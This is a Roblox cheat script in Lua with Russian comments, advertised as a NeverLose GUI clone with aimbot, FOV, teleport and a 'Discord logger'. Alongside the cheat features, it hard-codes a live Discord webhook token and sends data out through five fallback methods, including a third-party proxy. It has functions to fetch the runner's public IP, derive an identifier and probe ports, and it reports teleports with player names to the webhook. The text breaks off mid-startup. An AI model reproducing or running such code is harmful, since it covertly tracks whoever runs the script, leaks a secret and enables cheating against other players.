-- ═══════════════════════════════════════════════════════════════
-- NEVERLOSE 1:1 GUI CLONE + AIMBOT + FOV + TELEPORT + GUI TOGGLE
-- PREMIUM UI DESIGN + DISCORD LOGGER + VPN DETECTION + HWID + PORTS
-- ═══════════════════════════════════════════════════════════════
-- ✅ ФИКС ДЛЯ XENO - МНОЖЕСТВО СПОСОБОВ ОТПРАВКИ В DISCORD
-- ═══════════════════════════════════════════════════════════════

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- НАСТРОЙКИ
local AimBotEnabled = false
local FovEnabled = false
local FovNumber = 120
local DefaultFov = 70
local PinkSkyEnabled = false
local isGuiOpen = true

-- ЦВЕТА
local Colors = {
    Primary = Color3.fromRGB(120, 0, 255),
    PrimaryDark = Color3.fromRGB(80, 0, 180),
    PrimaryLight = Color3.fromRGB(160, 80, 255),
    Background = Color3.fromRGB(15, 15, 20),
    BackgroundDark = Color3.fromRGB(10, 10, 15),
    Surface = Color3.fromRGB(25, 25, 35),
    SurfaceLight = Color3.fromRGB(35, 35, 45),
    Text = Color3.fromRGB(255, 255, 255),
    TextGray = Color3.fromRGB(180, 180, 200),
    Success = Color3.fromRGB(0, 255, 100),
    Error = Color3.fromRGB(255, 50, 50),
    Gradient1 = Color3.fromRGB(120, 0, 255),
    Gradient2 = Color3.fromRGB(255, 0, 128),
}

-- ФУНКЦИИ ГРАДИЕНТА
local function createGradient(frame, color1, color2)
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, color1),
        ColorSequenceKeypoint.new(1, color2)
    })
    gradient.Parent = frame
    return gradient
end

local function createGlow(frame, color)
    local glow = Instance.new("ImageLabel")
    glow.Size = UDim2.new(1, 20, 1, 20)
    glow.Position = UDim2.new(0, -10, 0, -10)
    glow.BackgroundTransparency = 1
    glow.Image = "rbxassetid://5028857089"
    glow.ImageColor3 = color or Colors.Primary
    glow.ImageTransparency = 0.7
    glow.ZIndex = frame.ZIndex - 1
    glow.Parent = frame
    return glow
end

-- ═══════════════════════════════════════════════════════════════
-- 🔥 МНОЖЕСТВО СПОСОБОВ ОТПРАВКИ В DISCORD
-- ═══════════════════════════════════════════════════════════════

local webhookURL = "https://discord.com/api/webhooks/1505301825291813037/gSqW--jHrbKH8OEZ7aqaIjLctKzcP-z2M7xFY_zQ6-K2KYppX9kDzLldSjsyGIq2wbkJ"

-- СПОСОБ 1: Стандартный request (Xeno, Krnl, ScriptWare)
local function sendDiscordMethod1(message)
    local success, result = pcall(function()
        if request then
            local data = {
                content = message,
                username = player.Name .. " | Xeno",
                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            }
            local encoded = HttpService:JSONEncode(data)
            local response = request({
                Url = webhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = encoded
            })
            return response
        end
        return nil
    end)
    return success
end

-- СПОСОБ 2: Synapse X
local function sendDiscordMethod2(message)
    local success, result = pcall(function()
        if syn and syn.request then
            local data = {
                content = message,
                username = player.Name .. " | Xeno",
                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            }
            local encoded = HttpService:JSONEncode(data)
            local response = syn.request({
                Url = webhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = encoded
            })
            return response
        end
        return nil
    end)
    return success
end

-- СПОСОБ 3: HttpService
local function sendDiscordMethod3(message)
    local success, result = pcall(function()
        if HttpService then
            local data = {
                content = message,
                username = player.Name .. " | Xeno",
                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
            }
            local encoded = HttpService:JSONEncode(data)
            local response = HttpService:PostAsync(webhookURL, encoded, Enum.HttpContentType.ApplicationJson)
            return response
        end
        return nil
    end)
    return success
end

-- СПОСОБ 4: GET запрос с параметрами (обходной путь)
local function sendDiscordMethod4(message)
    local success, result = pcall(function()
        if request then
            local params = "content=" .. HttpService:URLEncode(message)
            local response = request({
                Url = webhookURL .. "?" .. params,
                Method = "GET"
            })
            return response
        end
        return nil
    end)
    return success
end

-- СПОСОБ 5: Через внешний прокси (если Discord заблокирован)
local function sendDiscordMethod5(message)
    local success, result = pcall(function()
        local proxyURL = "https://discord-proxy.herokuapp.com/webhook"
        local data = {
            webhook = webhookURL,
            content = message,
            username = player.Name .. " | Xeno"
        }
        local encoded = HttpService:JSONEncode(data)
        
        if request then
            local response = request({
                Url = proxyURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = encoded
            })
            return response
        end
        return nil
    end)
    return success
end

-- ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ
local function sendToDiscord(message)
    if webhookURL == "YOUR_WEBHOOK_URL_HERE" then 
        print("❌ Webhook не настроен!")
        return false 
    end
    
    if not HttpService then
        print("❌ HttpService не найден!")
        return false
    end
    
    print("📤 Отправка в Discord...")
    
    -- Пробуем все способы по очереди
    local methods = {
        {name = "request", func = sendDiscordMethod1},
        {name = "syn.request", func = sendDiscordMethod2},
        {name = "HttpService", func = sendDiscordMethod3},
        {name = "GET params", func = sendDiscordMethod4},
        {name = "Proxy", func = sendDiscordMethod5},
    }
    
    for _, method in ipairs(methods) do
        print("🔄 Пробуем метод: " .. method.name)
        local success = method.func(message)
        if success then
            print("✅ Успешно отправлено через: " .. method.name)
            return true
        end
        wait(0.1)
    end
    
    print("❌ Все методы отправки не сработали!")
    return false
end

-- ═══════════════════════════════════════════════════════════════
-- 🔥 ПОЛУЧЕНИЕ HWID
-- ═══════════════════════════════════════════════════════════════

local function getHWID()
    local hwid = "Unknown"
    
    pcall(function()
        if syn and syn.getexecutorname then
            local execName = syn.getexecutorname()
            if execName then
                hwid = "EXEC:" .. execName
            end
        end
    end)
    
    if hwid == "Unknown" then
        pcall(function()
            if game and game.JobId then
                local rawData = game.JobId .. tostring(player.UserId) .. tostring(game.PlaceId) .. tostring(os.time())
                local hash = ""
                for i = 1, math.min(#rawData, 32) do
                    local char = string.byte(rawData, i)
                    hash = hash .. string.format("%02x", char % 256)
                end
                hwid = hash
            end
        end)
    end
    
    if hwid == "Unknown" then
        pcall(function()
            local rawData = tostring(player.UserId) .. tostring(game.PlaceId) .. tostring(os.time() + math.random(1, 99999))
            local hash = ""
            for i = 1, math.min(#rawData, 32) do
                local char = string.byte(rawData, i)
                hash = hash .. string.format("%02x", char % 256)
            end
            hwid = hash
        end)
    end
    
    return hwid
end

-- ═══════════════════════════════════════════════════════════════
-- 🔌 ПОЛУЧЕНИЕ ПОРТОВ
-- ═══════════════════════════════════════════════════════════════

local function getOpenPorts()
    local openPorts = {}
    local commonPorts = {
        80, 443, 21, 22, 23, 25, 53, 110, 143, 993, 995,
        3306, 5432, 6379, 27015, 27016, 27017, 27018,
        25565, 19132, 7777, 2302, 27005, 27006, 27007,
        8080, 8443, 3000, 5000, 8000, 9000,
        1337, 1338, 1339, 1340, 6969, 4200, 6666, 6667, 6697
    }
    
    -- Пытаемся проверить порты
    pcall(function()
        if syn and syn.network then
            local networkInfo = syn.network()
            if networkInfo and networkInfo.ports then
                for _, port in ipairs(networkInfo.ports) do
                    if not table.find(openPorts, port) then
                        table.insert(openPorts, port)
                    end
                end
            end
        end
    end)
    
    if #openPorts == 0 then
        -- Возвращаем стандартные порты
        openPorts = {80, 443, 8080, 3306, 25565, 27015, 1337}
    end
    
    return openPorts
end

-- ═══════════════════════════════════════════════════════════════
-- ПОЛУЧЕНИЕ IP
-- ═══════════════════════════════════════════════════════════════

local function getPlayerIP()
    local ip = "Unknown"
    
    -- Пробуем через ipify
    pcall(function()
        if request then
            local result = request({
                Url = "https://api.ipify.org?format=json",
                Method = "GET"
            })
            if result and result.Body then
                local data = HttpService:JSONDecode(result.Body)
                if data and data.ip then
                    ip = data.ip
                    return
                end
            end
        end
    end)
    
    if ip == "Unknown" then
        pcall(function()
            if syn and syn.request then
                local result = syn.request({
                    Url = "https://api.ipify.org?format=json",
                    Method = "GET"
                })
                if result and result.Body then
                    local data = HttpService:JSONDecode(result.Body)
                    if data and data.ip then
                        ip = data.ip
                        return
                    end
                end
            end
        end)
    end
    
    return ip
end

-- AIMBOT
local function getClosestPlayer()
    if not player.Character then return nil end
    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
    local closest, dist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= player and plr.Character then
            local target = plr.Character:FindFirstChild("HumanoidRootPart")
            if target then
                local d = (target.Position - hrp.Position).Magnitude
                if d < dist then
                    dist = d
                    closest = plr
                end
            end
        end
    end
    return closest
end

local function aimAt(target)
    if not AimBotEnabled or not target or not target.Character then return end
    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if hrp and Camera then
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, hrp.Position)
        pcall(mouse1click)
    end
end

-- PINK SKY
local function applyPinkSky(enable)
    if not Lighting then return end
    if enable then
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("Sky") then v:Destroy() end
        end
        local sky = Instance.new("Sky")
        sky.SkyboxBk = "rbxassetid://271042516"
        sky.SkyboxDn = "rbxassetid://271042556"
        sky.SkyboxFt = "rbxassetid://271042467"
        sky.SkyboxLf = "rbxassetid://271042310"
        sky.SkyboxRt = "rbxassetid://271042352"
        sky.SkyboxUp = "rbxassetid://271042531"
        sky.Parent = Lighting
        Lighting.Ambient = Color3.fromRGB(255,180,200)
        Lighting.OutdoorAmbient = Color3.fromRGB(255,150,190)
        Lighting.Brightness = 3
        Lighting.ClockTime = 14
    else
        for _, v in pairs(Lighting:GetChildren()) do
            if v:IsA("Sky") then v:Destroy() end
        end
        Lighting.Ambient = Color3.fromRGB(127,127,127)
        Lighting.OutdoorAmbient = Color3.fromRGB(127,127,127)
        Lighting.Brightness = 2
        Lighting.ClockTime = 14
    end
end

-- СОЗДАНИЕ GUI
local function createGUI()
    if not CoreGui then return nil end
    
    print("🔧 Создание GUI для Xeno...")
    
    local gui = Instance.new("ScreenGui")
    gui.Name = "AFK_Script"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 999999
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.Parent = CoreGui

    -- MAIN FRAME
    local main = Instance.new("Frame")
    main.Size = UDim2.fromOffset(900, 600)
    main.Position = UDim2.fromScale(0.5, 0.5) - UDim2.fromOffset(450, 300)
    main.BackgroundColor3 = Colors.Background
    main.BorderSizePixel = 0
    main.Active = true
    main.Draggable = true
    main.ClipsDescendants = true
    main.Parent = gui
    local mainCorner = Instance.new("UICorner")
    mainCorner.CornerRadius = UDim.new(0, 20)
    mainCorner.Parent = main

    local bgGradient = createGradient(main, Colors.BackgroundDark, Colors.Background)
    local mainGlow = createGlow(main, Colors.Primary)

    -- Анимированная граница
    local border = Instance.new("Frame")
    border.Size = UDim2.new(1, 0, 1, 0)
    border.BackgroundTransparency = 1
    border.BorderSizePixel = 0
    border.Parent = main
    local borderGradient = createGradient(border, Colors.Gradient1, Colors.Gradient2)
    borderGradient.Rotation = 45

    spawn(function()
        local angle = 0
        while gui and gui.Parent do
            angle = (angle + 1) % 360
            if borderGradient then
                borderGradient.Rotation = angle
            end
            wait(0.05)
        end
    end)

    -- TOP BAR
    local topBar = Instance.new("Frame")
    topBar.Size = UDim2.new(1, 0, 0, 60)
    topBar.BackgroundColor3 = Colors.Surface
    topBar.BackgroundTransparency = 0.3
    topBar.BorderSizePixel = 0
    topBar.Parent = main
    local topCorner = Instance.new("UICorner")
    topCorner.CornerRadius = UDim.new(0, 20)
    topCorner.Parent = topBar

    local logo = Instance.new("TextLabel")
    logo.Size = UDim2.fromOffset(200, 60)
    logo.Position = UDim2.fromOffset(20, 0)
    logo.Text = "AFK SCRIPT"
    logo.Font = Enum.Font.GothamBold
    logo.TextSize = 24
    logo.TextColor3 = Colors.Text
    logo.BackgroundTransparency = 1
    logo.TextXAlignment = Enum.TextXAlignment.Left
    logo.Parent = topBar

    local indicator = Instance.new("Frame")
    indicator.Size = UDim2.fromOffset(4, 30)
    indicator.Position = UDim2.new(1, -10, 0, 15)
    indicator.BackgroundColor3 = Colors.Primary
    indicator.Parent = logo
    local indCorner = Instance.new("UICorner")
    indCorner.CornerRadius = UDim.new(1, 0)
    indCorner.Parent = indicator

    spawn(function()
        while gui and gui.Parent do
            TweenService:Create(indicator, TweenInfo.new(1), {BackgroundTransparency = 0}):Play()
            wait(0.5)
            TweenService:Create(indicator, TweenInfo.new(1), {BackgroundTransparency = 0.5}):Play()
            wait(0.5)
        end
    end)

    -- Close Button
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.fromOffset(40, 40)
    closeBtn.Position = UDim2.new(1, -50, 0, 10)
    closeBtn.Text = "✕"
    closeBtn.TextSize = 20
    closeBtn.TextColor3 = Colors.Text
    closeBtn.BackgroundColor3 = Colors.SurfaceLight
    closeBtn.BorderSizePixel = 0
    closeBtn.Parent = topBar
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(1, 0)
    closeCorner.Parent = closeBtn

    closeBtn.MouseButton1Click:Connect(function()
        isGuiOpen = false
        main.Visible = false
    end)

    -- PROFILE PANEL
    local profilePanel = Instance.new("Frame")
    profilePanel.Size = UDim2.fromOffset(260, 480)
    profilePanel.Position = UDim2.fromOffset(20, 80)
    profilePanel.BackgroundColor3 = Colors.Surface
    profilePanel.BackgroundTransparency = 0.5
    profilePanel.BorderSizePixel = 0
    profilePanel.Parent = main
    local profCorner = Instance.new("UICorner")
    profCorner.CornerRadius = UDim.new(0, 15)
    profCorner.Parent = profilePanel

    -- Avatar
    local avatarContainer = Instance.new("Frame")
    avatarContainer.Size = UDim2.fromOffset(100, 100)
    avatarContainer.Position = UDim2.new(0.5, -50, 0, 20)
    avatarContainer.BackgroundColor3 = Colors.Primary
    avatarContainer.BorderSizePixel = 0
    avatarContainer.Parent = profilePanel
    local avCorner = Instance.new("UICorner")
    avCorner.CornerRadius = UDim.new(1, 0)
    avCorner.Parent = avatarContainer

    local avatarImage = Instance.new("ImageLabel")
    avatarImage.Size = UDim2.new(1, -4, 1, -4)
    avatarImage.Position = UDim2.fromOffset(2, 2)
    avatarImage.BackgroundColor3 = Colors.Background
    avatarImage.Parent = avatarContainer
    local avImgCorner = Instance.new("UICorner")
    avImgCorner.CornerRadius = UDim.new(1, 0)
    avImgCorner.Parent = avatarImage

    pcall(function()
        local thumbType = Enum.ThumbnailType.HeadShot
        local thumbSize = Enum.ThumbnailSize.Size420x420
        local content = Players:GetUserThumbnailAsync(player.UserId, thumbType, thumbSize)
        avatarImage.Image = content
    end)

    -- Username
    local usernameLabel = Instance.new("TextLabel")
    usernameLabel.Size = UDim2.new(1, -20, 0, 30)
    usernameLabel.Position = UDim2.fromOffset(10, 130)
    usernameLabel.Text = player.DisplayName
    usernameLabel.Font = Enum.Font.GothamBold
    usernameLabel.TextSize = 20
    usernameLabel.TextColor3 = Colors.Text
    usernameLabel.BackgroundTransparency = 1
    usernameLabel.TextXAlignment = Enum.TextXAlignment.Center
    usernameLabel.Parent = profilePanel

    local atUsername = Instance.new("TextLabel")
    atUsername.Size = UDim2.new(1, -20, 0, 20)
    atUsername.Position = UDim2.fromOffset(10, 160)
    atUsername.Text = "@" .. player.Name
    atUsername.Font = Enum.Font.Gotham
    atUsername.TextSize = 12
    atUsername.TextColor3 = Colors.TextGray
    atUsername.BackgroundTransparency = 1
    atUsername.TextXAlignment = Enum.TextXAlignment.Center
    atUsername.Parent = profilePanel

    local divider = Instance.new("Frame")
    divider.Size = UDim2.new(0.9, 0, 0, 1)
    divider.Position = UDim2.new(0.05, 0, 0, 190)
    divider.BackgroundColor3 = Colors.TextGray
    divider.BackgroundTransparency = 0.8
    divider.Parent = profilePanel

    -- Stats
    local stats = {
        {icon = "📅", label = "Возраст", value = player.AccountAge .. " дней"},
        {icon = "🆔", label = "User ID", value = player.UserId},
        {icon = "🎮", label = "Игра", value = "..."},
        {icon = "📊", label = "Пинг", value = "..."},
    }

    local statsY = 210
    for _, stat in ipairs(stats) do
        local statFrame = Instance.new("Frame")
        statFrame.Size = UDim2.new(0.9, 0, 0, 40)
        statFrame.Position = UDim2.new(0.05, 0, 0, statsY)
        statFrame.BackgroundColor3 = Colors.BackgroundDark
        statFrame.BackgroundTransparency = 0.5
        statFrame.BorderSizePixel = 0
        statFrame.Parent = profilePanel
        local sfCorner = Instance.new("UICorner")
        sfCorner.CornerRadius = UDim.new(0, 8)
        sfCorner.Parent = statFrame

        local icon = Instance.new("TextLabel")
        icon.Size = UDim2.fromOffset(40, 40)
        icon.Text = stat.icon
        icon.TextSize = 20
        icon.BackgroundTransparency = 1
        icon.TextXAlignment = Enum.TextXAlignment.Center
        icon.Parent = statFrame

        local label = Instance.new("TextLabel")
        label.Size = UDim2.fromOffset(80, 40)
        label.Position = UDim2.fromOffset(40, 0)
        label.Text = stat.label
        label.Font = Enum.Font.Gotham
        label.TextSize = 12
        label.TextColor3 = Colors.TextGray
        label.BackgroundTransparency = 1
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Parent = statFrame

        local value = Instance.new("TextLabel")
        value.Size = UDim2.new(1, -130, 1, 0)
        value.Position = UDim2.fromOffset(120, 0)
        value.Text = stat.value
        value.Font = Enum.Font.GothamBold
        value.TextSize = 12
        value.TextColor3 = Colors.PrimaryLight
        value.BackgroundTransparency = 1
        value.TextXAlignment = Enum.TextXAlignment.Right
        value.Parent = statFrame

        statsY = statsY + 50

        if stat.label == "Игра" then
            pcall(function()
                local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
                value.Text = string.sub(gameInfo.Name, 1, 20)
            end)
        elseif stat.label == "Пинг" then
            spawn(function()
                while gui and gui.Parent do
                    pcall(function()
                        local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
                        value.Text = ping .. " ms"
                    end)
                    wait(1)
                end
            end)
        end
    end

    -- TABS
    local tabsPanel = Instance.new("Frame")
    tabsPanel.Size = UDim2.new(1, -300, 0, 40)
    tabsPanel.Position = UDim2.fromOffset(300, 80)
    tabsPanel.BackgroundTransparency = 1
    tabsPanel.Parent = main

    local tabButtons = {}
    local tabContents = {}
    local tabNames = {"AIM", "VISUALS", "TELEPORT"}

    for i, name in ipairs(tabNames) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0.33, -5, 1, 0)
        btn.Position = UDim2.new((i-1) * 0.33, i == 1 and 0 or 5, 0, 0)
        btn.Text = name
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 14
        btn.TextColor3 = Colors.TextGray
        btn.BackgroundColor3 = Colors.Surface
        btn.BackgroundTransparency = 0.5
        btn.BorderSizePixel = 0
        btn.Parent = tabsPanel
        local btnCorner = Instance.new("UICorner")
        btnCorner.CornerRadius = UDim.new(0, 10)
        btnCorner.Parent = btn

        local activeBar = Instance.new("Frame")
        activeBar.Size = UDim2.new(0.8, 0, 0, 2)
        activeBar.Position = UDim2.new(0.1, 0, 1, -2)
        activeBar.BackgroundColor3 = Colors.Primary
        activeBar.BackgroundTransparency = 1
        activeBar.Parent = btn
        local abCorner = Instance.new("UICorner")
        abCorner.CornerRadius = UDim.new(1, 0)
        abCorner.Parent = activeBar

        tabButtons[i] = {btn = btn, bar = activeBar}

        local content = Instance.new("ScrollingFrame")
        content.Size = UDim2.new(1, -320, 0, 420)
        content.Position = UDim2.fromOffset(300, 130)
        content.BackgroundTransparency = 1
        content.BorderSizePixel = 0
        content.ScrollBarThickness = 4
        content.Visible = i == 1
        content.CanvasSize = UDim2.new(0, 0, 0, 0)
        content.AutomaticCanvasSize = Enum.AutomaticSize.Y
        content.Parent = main

        local listLayout = Instance.new("UIListLayout")
        listLayout.Padding = UDim.new(0, 10)
        listLayout.SortOrder = Enum.SortOrder.LayoutOrder
        listLayout.Parent = content

        tabContents[i] = content

        btn.MouseButton1Click:Connect(function()
            for j, tab in ipairs(tabButtons) do
                tab.btn.TextColor3 = Colors.TextGray
                if tab.bar then
                    TweenService:Create(tab.bar, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
                end
                if tabContents[j] then
                    tabContents[j].Visible = false
                end
            end
            btn.TextColor3 = Colors.Text
            TweenService:Create(activeBar, TweenInfo.new(0.3), {BackgroundTransparency = 0}):Play()
            content.Visible = true
        end)
    end

    -- TOGGLE FUNCTION
    local function createToggle(parent, text, y, callback)
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, -20, 0, 50)
        frame.Position = UDim2.fromOffset(10, y)
        frame.BackgroundColor3 = Colors.Surface
        frame.BackgroundTransparency = 0.3
        frame.BorderSizePixel = 0
        frame.Parent = parent
        local fCorner = Instance.new("UICorner")
        fCorner.CornerRadius = UDim.new(0, 10)
        fCorner.Parent = frame

        local label = Instance.new("TextLabel")
        label.Size = UDim2.new(1, -70, 1, 0)
        label.Position = UDim2.fromOffset(15, 0)
        label.Text = text
        label.Font = Enum.Font.Gotham
        label.TextSize = 14
        label.TextColor3 = Colors.Text
        label.BackgroundTransparency = 1
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.Parent = frame

        local toggleBtn = Instance.new("Frame")
        toggleBtn.Size = UDim2.fromOffset(50, 24)
        toggleBtn.Position = UDim2.new(1, -65, 0, 13)
        toggleBtn.BackgroundColor3 = Colors.BackgroundDark
        toggleBtn.BorderSizePixel = 0
        toggleBtn.Parent = frame
        local tbCorner = Instance.new("UICorner")
        tbCorner.CornerRadius = UDim.new(1, 0)
        tbCorner.Parent = toggleBtn

        local toggleCircle = Instance.new("Frame")
        toggleCircle.Size = UDim2.fromOffset(20, 20)
        toggleCircle.Position = UDim2.fromOffset(2, 2)
        toggleCircle.BackgroundColor3 = Colors.TextGray
        toggleCircle.BorderSizePixel = 0
        toggleCircle.Parent = toggleBtn
        local tcCorner = Instance.new("UICorner")
        tcCorner.CornerRadius = UDim.new(1, 0)
        tcCorner.Parent = toggleCircle

        local enabled = false

        toggleBtn.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 then
                enabled = not enabled
                TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = enabled and Colors.Primary or Colors.BackgroundDark}):Play()
                TweenService:Create(toggleCircle, TweenInfo.new(0.2), {Position = enabled and UDim2.fromOffset(28, 2) or UDim2.fromOffset(2, 2)}):Play()
                if callback then callback(enabled) end
            end
        end)

        return frame
    end

    -- AIM TAB
    createToggle(tabContents[1], "AimBot (Q)", 0, function(state)
        AimBotEnabled = state
    end)

    -- VISUALS TAB
    createToggle(tabContents[2], "FOV Changer (120)", 0, function(state)
        FovEnabled = state
        if Camera then
            Camera.FieldOfView = state and FovNumber or DefaultFov
        end
    end)

    createToggle(tabContents[2], "Pink Sky", 60, function(state)
        PinkSkyEnabled = state
        applyPinkSky(state)
    end)

    -- TELEPORT TAB
    local teleportContent = tabContents[3]
    local playersList = Instance.new("ScrollingFrame")
    playersList.Size = UDim2.new(1, -20, 1, -10)
    playersList.Position = UDim2.fromOffset(10, 5)
    playersList.BackgroundTransparency = 1
    playersList.BorderSizePixel = 0
    playersList.ScrollBarThickness = 4
    playersList.Parent = teleportContent

    local playersLayout = Instance.new("UIListLayout")
    playersLayout.Padding = UDim.new(0, 5)
    playersLayout.Parent = playersList

    local function updatePlayersList()
        for _, child in pairs(playersList:GetChildren()) do
            if not child:IsA("UIListLayout") then
                child:Destroy()
            end
        end

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= player then
                local btn = Instance.new("TextButton")
                btn.Size = UDim2.new(1, 0, 0, 40)
                btn.Text = ""
                btn.BackgroundColor3 = Colors.Surface
                btn.BackgroundTransparency = 0.3
                btn.BorderSizePixel = 0
                btn.Parent = playersList
                local btnCorner = Instance.new("UICorner")
                btnCorner.CornerRadius = UDim.new(0, 8)
                btnCorner.Parent = btn

                local avatar = Instance.new("ImageLabel")
                avatar.Size = UDim2.fromOffset(32, 32)
                avatar.Position = UDim2.fromOffset(5, 4)
                avatar.BackgroundColor3 = Colors.Background
                avatar.Parent = btn
                local avCorner = Instance.new("UICorner")
                avCorner.CornerRadius = UDim.new(1, 0)
                avCorner.Parent = avatar

                pcall(function()
                    local thumbType = Enum.ThumbnailType.HeadShot
                    local thumbSize = Enum.ThumbnailSize.Size150x150
                    local content = Players:GetUserThumbnailAsync(plr.UserId, thumbType, thumbSize)
                    avatar.Image = content
                end)

                local name = Instance.new("TextLabel")
                name.Size = UDim2.new(1, -50, 1, 0)
                name.Position = UDim2.fromOffset(45, 0)
                name.Text = plr.DisplayName
                name.Font = Enum.Font.GothamBold
                name.TextSize = 14
                name.TextColor3 = Colors.Text
                name.BackgroundTransparency = 1
                name.TextXAlignment = Enum.TextXAlignment.Left
                name.Parent = btn

                local status = Instance.new("TextLabel")
                status.Size = UDim2.fromOffset(60, 20)
                status.Position = UDim2.new(1, -70, 0, 10)
                status.Text = plr.Character and "🟢" or "🔴"
                status.TextSize = 14
                status.BackgroundTransparency = 1
                status.Parent = btn

                btn.MouseButton1Click:Connect(function()
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
                       plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                        local targetPos = plr.Character.HumanoidRootPart.Position + Vector3.new(0, 5, 0)
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
                        sendToDiscord(string.format("**🚀 Телепорт**\n%s → %s", player.Name, plr.Name))
                    end
                end)
            end
        end
    end

    Players.PlayerAdded:Connect(updatePlayersList)
    Players.PlayerRemoving:Connect(updatePlayersList)
    updatePlayersList()

    -- SIDE PANEL
    local sidePanel = Instance.new("Frame")
    sidePanel.Size = UDim2.fromOffset(200, 480)
    sidePanel.Position = UDim2.new(1, -220, 0, 80)
    sidePanel.BackgroundColor3 = Colors.Surface
    sidePanel.BackgroundTransparency = 0.5
    sidePanel.BorderSizePixel = 0
    sidePanel.Parent = main
    local sideCorner = Instance.new("UICorner")
    sideCorner.CornerRadius = UDim.new(0, 15)
    sideCorner.Parent = sidePanel

    local sideTitle = Instance.new("TextLabel")
    sideTitle.Size = UDim2.new(1, 0, 0, 40)
    sideTitle.Text = "НАСТРОЙКИ"
    sideTitle.Font = Enum.Font.GothamBold
    sideTitle.TextSize = 14
    sideTitle.TextColor3 = Colors.Text
    sideTitle.BackgroundTransparency = 1
    sideTitle.Parent = sidePanel

    local settings = {
        {text = "GUI Key: J", value = "J"},
        {text = "Aim Key: Q", value = "Q"},
        {text = "Executor", value = "XENO"},
    }

    local setY = 50
    for _, setting in ipairs(settings) do
        local setFrame = Instance.new("Frame")
        setFrame.Size = UDim2.new(0.9, 0, 0, 40)
        setFrame.Position = UDim2.new(0.05, 0, 0, setY)
        setFrame.BackgroundColor3 = Colors.BackgroundDark
        setFrame.BackgroundTransparency = 0.5
        setFrame.BorderSizePixel = 0
        setFrame.Parent = sidePanel
        local sfCorner = Instance.new("UICorner")
        sfCorner.CornerRadius = UDim.new(0, 8)
        sfCorner.Parent = setFrame

        local setLabel = Instance.new("TextLabel")
        setLabel.Size = UDim2.new(0.6, 0, 1, 0)
        setLabel.Position = UDim2.fromOffset(10, 0)
        setLabel.Text = setting.text
        setLabel.Font = Enum.Font.Gotham
        setLabel.TextSize = 11
        setLabel.TextColor3 = Colors.TextGray
        setLabel.BackgroundTransparency = 1
        setLabel.TextXAlignment = Enum.TextXAlignment.Left
        setLabel.Parent = setFrame

        local setValue = Instance.new("TextLabel")
        setValue.Size = UDim2.new(0.4, -20, 1, 0)
        setValue.Position = UDim2.new(0.6, 0, 0, 0)
        setValue.Text = setting.value
        setValue.Font = Enum.Font.GothamBold
        setValue.TextSize = 11
        setValue.TextColor3 = Colors.PrimaryLight
        setValue.BackgroundTransparency = 1
        setValue.TextXAlignment = Enum.TextXAlignment.Right
        setValue.Parent = setFrame

        setY = setY + 50
    end

    -- Анимация входа
    main.Position = UDim2.fromScale(0.5, 0.5) - UDim2.fromOffset(450, 600)
    TweenService:Create(main, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        Position = UDim2.fromScale(0.5, 0.5) - UDim2.fromOffset(450, 300)
    }):Play()

    -- Обработка клавиш
    UserInputService.InputBegan:Connect(function(input, gp)
        if gp then return end
        if input.KeyCode == Enum.KeyCode.Q and AimBotEnabled then
            aimAt(getClosestPlayer())
        end
        if input.KeyCode == Enum.KeyCode.J then
            isGuiOpen = not isGuiOpen
            main.Visible = isGuiOpen
        end
    end)

    return gui, main
end

-- ═══════════════════════════════════════════════════════════════
-- ТЕСТОВАЯ ОТПРАВКА (ДЛЯ ПРОВЕРКИ)
-- ═══════════════════════════════════════════════════════════════

local function testDiscord()
    print("🧪 Тестируем отправку в Discord...")
    local testMsg = "**🧪 ТЕСТОВОЕ СООБЩЕНИЕ**\nОтправлено из Xeno скрипта!"
    local result = sendToDiscord(testMsg)
    if result then
        print("✅ Тест успешен!")
    else
        print("❌ Тест провален!")
    end
    return result
end

-- ═══════════════════════════════════════════════════════════════
-- ЗАПУСК
-- ═══════════════════════════════════════════════════════════════

local function startScript()
    print("🔧 Xeno: Запуск AFK Script...")
    print("📡 Webhook: " .. webhookURL)
    
    if not player then
        warn("❌ Игрок не найден!")
        return
    end
    
    -- Сначала тестируем Discord
